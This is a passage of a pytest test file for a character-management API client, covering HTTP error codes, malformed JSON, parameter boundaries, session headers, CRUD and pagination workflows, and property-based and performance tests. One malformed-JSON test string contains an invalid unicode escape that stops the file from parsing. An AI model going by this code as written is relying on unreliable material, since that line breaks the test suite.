        (102, HTTPError),  # Processing
        (300, HTTPError),  # Multiple Choices
        (301, HTTPError),  # Moved Permanently
        (307, HTTPError),  # Temporary Redirect
        (308, HTTPError),  # Permanent Redirect
        (400, HTTPError),  # Bad Request
        (402, HTTPError),  # Payment Required
        (405, HTTPError),  # Method Not Allowed
        (406, HTTPError),  # Not Acceptable
        (408, HTTPError),  # Request Timeout
        (409, HTTPError),  # Conflict
        (410, HTTPError),  # Gone
        (412, HTTPError),  # Precondition Failed
        (413, HTTPError),  # Payload Too Large
        (414, HTTPError),  # URI Too Long
        (415, HTTPError),  # Unsupported Media Type
        (417, HTTPError),  # Expectation Failed
        (418, HTTPError),  # I'm a teapot
        (422, HTTPError),  # Unprocessable Entity
        (423, HTTPError),  # Locked
        (424, HTTPError),  # Failed Dependency
        (426, HTTPError),  # Upgrade Required
        (428, HTTPError),  # Precondition Required
        (429, HTTPError),  # Too Many Requests
        (431, HTTPError),  # Request Header Fields Too Large
        (451, HTTPError),  # Unavailable For Legal Reasons
        (500, HTTPError),  # Internal Server Error
        (501, HTTPError),  # Not Implemented
        (502, HTTPError),  # Bad Gateway
        (503, HTTPError),  # Service Unavailable
        (504, HTTPError),  # Gateway Timeout
        (505, HTTPError),  # HTTP Version Not Supported
        (507, HTTPError),  # Insufficient Storage
        (508, HTTPError),  # Loop Detected
        (510, HTTPError),  # Not Extended
        (511, HTTPError),  # Network Authentication Required
    ])
    @patch('requests.Session.get')
    def test_comprehensive_http_status_codes(self, mock_get, client, status_code, error_class):
        """Test handling of comprehensive HTTP status codes."""
        mock_response = Mock()
        mock_response.status_code = status_code
        mock_response.raise_for_status.side_effect = HTTPError(f"{status_code} Error")
        mock_get.return_value = mock_response

        with pytest.raises(error_class):
            client.get_character(1)

    # =============================================================================================
    # JSON AND DATA FORMAT EDGE CASES
    # =============================================================================================

    @pytest.mark.parametrize("malformed_json", [
        '{"id": 1, "name": "test"',  # Missing closing brace
        '{"id": 1, "name": "test"}}',  # Extra closing brace
        '{"id": 1, "name": "test",}',  # Trailing comma
        '{"id": 1, "name": test}',  # Unquoted string
        '{id: 1, name: "test"}',  # Unquoted keys
        '{"id": 01, "name": "test"}',  # Leading zero in number
        '{"id": 1, "name": "\u"}',  # Invalid unicode escape
        '{"id": 1, "name": "test"]\n',  # Mixed brackets
        '',  # Empty response
        'null',  # Null response
        'undefined',  # Undefined response
        '[]',  # Array instead of object
        'true',  # Boolean response
        '42',  # Number response
    ])
    @patch('requests.Session.get')
    def test_malformed_json_responses(self, mock_get, client, malformed_json):
        """Test handling of various malformed JSON responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.raise_for_status.return_value = None
        mock_response.text = malformed_json
        
        # Simulate JSON decoding error for malformed JSON
        if malformed_json in ['', 'null', 'undefined', '[]', 'true', '42']:
            if malformed_json == '[]':
                mock_response.json.return_value = []
            elif malformed_json == 'null':
                mock_response.json.return_value = None
            elif malformed_json == 'true':
                mock_response.json.return_value = True
            elif malformed_json == '42':
                mock_response.json.return_value = 42
            else:
                mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", malformed_json, 0)
        else:
            mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", malformed_json, 0)
        
        mock_get.return_value = mock_response

        if malformed_json in ['[]', 'true', '42']:
            # These should not raise JSON errors but may return unexpected data
            result = client.get_character(1)
            assert result is not None
        elif malformed_json == 'null':
            result = client.get_character(1)
            assert result is None
        else:
            with pytest.raises(json.JSONDecodeError):
                client.get_character(1)

    # =============================================================================================
    # PARAMETER VALIDATION AND BOUNDARY TESTING
    # =============================================================================================

    @pytest.mark.parametrize("boundary_values", [
        # Integer boundaries
        {"page": 0, "limit": 1},
        {"page": 1, "limit": 0},
        {"page": 2**31 - 1, "limit": 1},  # Max 32-bit int
        {"page": 1, "limit": 2**31 - 1},
        {"page": -2**31, "limit": 1},  # Min 32-bit int
        {"page": 1, "limit": -2**31},
        
        # Floating point boundaries
        {"page": 1.0, "limit": 20},
        {"page": 1, "limit": 20.5},
        
        # Very large numbers
        {"page": 10**100, "limit": 1},
        {"page": 1, "limit": 10**100},
    ])
    @patch('requests.Session.get')
    def test_parameter_boundary_values(self, mock_get, client, boundary_values):
        """Test parameter validation with boundary values."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        # Should handle boundary values gracefully
        try:
            result = client.get_all_characters(**boundary_values)
            assert isinstance(result, list)
        except (TypeError, ValueError, OverflowError):
            # Acceptable to reject invalid parameter types/values
            pass

    @pytest.mark.parametrize("search_params", [
        # Empty string parameters
        {"name": "", "character_class": "", "level_min": None, "level_max": None},
        
        # Whitespace-only parameters
        {"name": "   ", "character_class": "\t\n", "level_min": None, "level_max": None},
        
        # Very long strings
        {"name": "A" * 1000, "character_class": "B" * 500},
        
        # Special characters in all fields
        {"name": "!@#$%^&*()", "character_class": "<>?:\"{}[]"},
        
        # Numeric strings where numbers expected
        {"level_min": "10", "level_max": "20"},
        
        # Invalid ranges
        {"level_min": 50, "level_max": 10},  # Min > Max
    ])
    @patch('requests.Session.get')
    def test_search_parameter_edge_cases(self, mock_get, client, search_params):
        """Test search functionality with edge case parameters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        # Test if at least one parameter is provided (skip empty cases)
        if any(v for v in search_params.values()):
            try:
                result = client.search_characters(**search_params)
                assert isinstance(result, list)
            except (TypeError, ValueError):
                # Acceptable to reject invalid parameter combinations
                pass

    # =============================================================================================
    # SESSION AND CONNECTION MANAGEMENT TESTS
    # =============================================================================================

    def test_session_state_consistency(self, client):
        """Test that session state remains consistent across operations."""
        original_headers = client.session.headers.copy()
        original_session_id = id(client.session)
        
        # Perform multiple operations
        with patch('requests.Session.get') as mock_get, \
             patch('requests.Session.post') as mock_post:
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"id": 1}
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response
            mock_post.return_value = mock_response

            # Multiple operations
            client.get_character(1)
            client.create_character({"name": "Test"})
            client.get_all_characters()
            client.search_characters(name="test")

        # Verify session consistency
        assert id(client.session) == original_session_id
        assert client.session.headers == original_headers

    def test_session_header_management(self, client_with_custom_session):
        """Test proper management of session headers."""
        client = client_with_custom_session
        
        # Verify initial headers
        assert "Authorization" in client.session.headers
        assert "User-Agent" in client.session.headers
        assert "Accept-Language" in client.session.headers
        
        # Add additional headers
        client.session.headers.update({
            "X-Request-ID": "test-request-123",
            "X-Client-Version": "1.0.0"
        })
        
        # Verify headers persist
        assert len(client.session.headers) >= 5
        assert client.session.headers["X-Request-ID"] == "test-request-123"

    # =============================================================================================
    # INTEGRATION AND WORKFLOW TESTS
    # =============================================================================================

    @patch('requests.Session.post')
    @patch('requests.Session.get') 
    @patch('requests.Session.put')
    @patch('requests.Session.delete')
    def test_complete_character_management_workflow(self, mock_delete, mock_put, mock_get, mock_post, client):
        """Test a complete character management workflow with multiple operations."""
        # Setup mock responses for each operation
        character_data = {"name": "Workflow Character", "class": "Wizard", "level": 1}
        created_character = {"id": 1, **character_data}
        updated_character = {**created_character, "level": 10, "experience": 5000}
        
        # Create
        mock_post_response = Mock()
        mock_post_response.status_code = 201
        mock_post_response.json.return_value = created_character
        mock_post_response.raise_for_status.return_value = None
        mock_post.return_value = mock_post_response
        
        # Read (multiple calls)
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.raise_for_status.return_value = None
        mock_get.return_value = mock_get_response
        
        # First read returns created character
        mock_get_response.json.return_value = created_character
        
        # Update
        mock_put_response = Mock()
        mock_put_response.status_code = 200
        mock_put_response.json.return_value = updated_character
        mock_put_response.raise_for_status.return_value = None
        mock_put.return_value = mock_put_response
        
        # Delete
        mock_delete_response = Mock()
        mock_delete_response.status_code = 204
        mock_delete_response.raise_for_status.return_value = None
        mock_delete.return_value = mock_delete_response

        # Execute workflow
        # 1. Create character
        created = client.create_character(character_data)
        assert created["id"] == 1
        assert created["name"] == "Workflow Character"
        
        # 2. Read created character
        retrieved = client.get_character(1)
        assert retrieved["id"] == 1
        
        # 3. Update character  
        mock_get_response.json.return_value = updated_character  # Update mock for subsequent reads
        updated = client.update_character(1, {"level": 10, "experience": 5000})
        assert updated["level"] == 10
        
        # 4. Verify update
        verified = client.get_character(1)
        assert verified["level"] == 10
        
        # 5. Delete character
        deleted = client.delete_character(1)
        assert deleted is True
        
        # Verify all operations were called
        mock_post.assert_called_once()
        assert mock_get.call_count == 2
        mock_put.assert_called_once()
        mock_delete.assert_called_once()

    @patch('requests.Session.get')
    def test_search_pagination_workflow(self, mock_get, client):
        """Test a complete search and pagination workflow."""
        # Mock paginated search results
        page1_results = [{"id": i, "name": f"Character {i}"} for i in range(1, 21)]
        page2_results = [{"id": i, "name": f"Character {i}"} for i in range(21, 41)]
        page3_results = [{"id": i, "name": f"Character {i}"} for i in range(41, 46)]
        
        search_response = Mock()
        search_response.status_code = 200
        search_response.raise_for_status.return_value = None
        
        # Configure different responses for each call
        mock_get.side_effect = [
            # Search call
            Mock(status_code=200, json=lambda: {"results": page1_results, "total": 45}, raise_for_status=lambda: None),
            # Page 1
            Mock(status_code=200, json=lambda: page1_results, raise_for_status=lambda: None),
            # Page 2  
            Mock(status_code=200, json=lambda: page2_results, raise_for_status=lambda: None),
            # Page 3
            Mock(status_code=200, json=lambda: page3_results, raise_for_status=lambda: None),
        ]

        # Execute workflow
        # 1. Initial search
        search_results = client.search_characters(name="Character")
        assert "total" in search_results or isinstance(search_results, list)
        
        # 2. Get paginated results
        page1 = client.get_all_characters(page=1, limit=20)
        assert len(page1) == 20
        
        page2 = client.get_all_characters(page=2, limit=20)
        assert len(page2) == 20
        
        page3 = client.get_all_characters(page=3, limit=20)
        assert len(page3) == 5  # Last page has fewer results
        
        # Verify all pages have unique characters
        all_characters = page1 + page2 + page3
        character_ids = [char["id"] for char in all_characters]
        assert len(set(character_ids)) == 45  # All unique IDs
        assert mock_get.call_count == 4


# =============================================================================================
# PROPERTY-BASED TESTING (Advanced)
# =============================================================================================

try:
    from hypothesis import given, strategies as st, settings, assume
    from hypothesis import HealthCheck

    class TestCharacterClientPropertyBased:
        """
        Property-based tests using Hypothesis for comprehensive edge case coverage.
        Testing framework: pytest with hypothesis
        """

        @given(
            character_id=st.integers(min_value=1, max_value=1000000),
            timeout_value=st.integers(min_value=1, max_value=300)
        )
        @settings(max_examples=50, suppress_health_check=[HealthCheck.function_scoped_fixture])
        @patch('requests.Session.get')
        def test_get_character_property_based(self, mock_get, character_id, timeout_value):
            """Property test: get_character should work with any valid ID and timeout."""
            sample_character = {"id": character_id, "name": f"Character {character_id}"}
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = sample_character
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            client = CharacterClient(timeout=timeout_value)
            result = client.get_character(character_id)
            
            assert result["id"] == character_id
            assert isinstance(result["name"], str)

        @given(
            name=st.text(min_size=1, max_size=100).filter(lambda x: x.strip()),
            char_class=st.text(min_size=1, max_size=50).filter(lambda x: x.strip()),
            level=st.integers(min_value=1, max_value=100)
        )
        @settings(max_examples=30)
        @patch('requests.Session.post')
        def test_create_character_property_based(self, mock_post, name, char_class, level):
            """Property test: character creation with various valid inputs."""
            character_data = {"name": name, "class": char_class, "level": level}
            created_character = {"id": 1, **character_data}
            
            mock_response = Mock()
            mock_response.status_code = 201
            mock_response.json.return_value = created_character
            mock_response.raise_for_status.return_value = None
            mock_post.return_value = mock_response

            client = CharacterClient()
            result = client.create_character(character_data)
            
            assert result["name"] == name
            assert result["class"] == char_class
            assert result["level"] == level

        @given(
            page=st.integers(min_value=1, max_value=1000),
            limit=st.integers(min_value=1, max_value=100)
        )
        @settings(max_examples=25)
        @patch('requests.Session.get')
        def test_pagination_properties(self, mock_get, page, limit):
            """Property test: pagination should work with any reasonable values."""
            mock_characters = [{"id": i, "name": f"Char {i}"} for i in range(limit)]
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = mock_characters
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            client = CharacterClient()
            result = client.get_all_characters(page=page, limit=limit)
            
            assert isinstance(result, list)
            assert len(result) <= limit

        @given(
            search_text=st.text(min_size=1, max_size=200),
            min_level=st.integers(min_value=1, max_value=50),
            max_level=st.integers(min_value=51, max_value=100)
        )
        @settings(max_examples=20)
        @patch('requests.Session.get')
        def test_search_parameters_property_based(self, mock_get, search_text, min_level, max_level):
            """Property test: search should handle various parameter combinations."""
            assume(min_level <= max_level)  # Ensure valid level range
            
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = []
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            client = CharacterClient()
            result = client.search_characters(
                name=search_text,
                level_min=min_level,
                level_max=max_level
            )
            
            assert isinstance(result, list)

except ImportError:
    # Hypothesis not available, skip property-based tests
    print("Hypothesis not available, skipping property-based tests")


# =============================================================================================
# BENCHMARK AND PERFORMANCE REGRESSION TESTS
# =============================================================================================

class TestCharacterClientPerformance:
    """
    Performance and benchmark tests to detect regressions.
    Testing framework: pytest
    """

    @pytest.fixture
    def performance_client(self):
        """Client configured for performance testing."""
        return CharacterClient(base_url="https://api.test.com", timeout=1)

    @patch('requests.Session.get')
    def test_single_request_performance_baseline(self, mock_get, performance_client, sample_character):
        """Establish performance baseline for single requests."""
        import time
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        # Warm up
        performance_client.get_character(1)
        
        # Measure performance
        start_time = time.perf_counter()
        for _ in range(100):
            performance_client.get_character(1)
        end_time = time.perf_counter()
        
        total_time = end_time - start_time
        avg_time = total_time / 100
        
        # Performance assertions (with mocks, these should be very fast)
        assert total_time < 1.0  # 100 requests in under 1 second
        assert avg_time < 0.01   # Average under 10ms per request
        assert mock_get.call_count == 101  # 1 warmup + 100 measured

    @patch('requests.Session.post')
    def test_create_requests_performance(self, mock_post, performance_client, sample_character):
        """Test performance of character creation requests."""
        import time
        
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        character_data = {"name": "Perf Test", "class": "Warrior", "level": 1}
        
        # Measure creation performance
        start_time = time.perf_counter()
        for i in range(50):
            performance_client.create_character({**character_data, "name": f"Perf Test {i}"})
        end_time = time.perf_counter()
        
        total_time = end_time - start_time
        avg_time = total_time / 50
        
        assert total_time < 1.0  # 50 creates in under 1 second
        assert avg_time < 0.02   # Average under 20ms per create
        assert mock_post.call_count == 50

    def test_memory_usage_stability(self, performance_client):
        """Test that memory usage remains stable under load."""
        import gc
        import sys
        
        # Get initial memory usage (approximate)
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        with patch('requests.Session.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"id": 1, "name": "Memory Test"}
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            # Perform many operations
            for i in range(1000):
                performance_client.get_character(i)
                if i % 100 == 0:
                    gc.collect()  # Periodic cleanup
        
        # Check final memory usage
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Memory should not grow excessively (allow some growth for test artifacts)
        memory_growth = final_objects - initial_objects
        assert memory_growth < 1000  # Less than 1000 new objects retained


if __name__ == '__main__':
    # Run with comprehensive options
    pytest.main([
        __file__, 
        '-v',                    # Verbose output
        '--tb=short',           # Short traceback format
        '--strict-markers',     # Strict marker handling
        '--disable-warnings',   # Reduce noise
        '-x',                   # Stop on first failure for debugging
    ])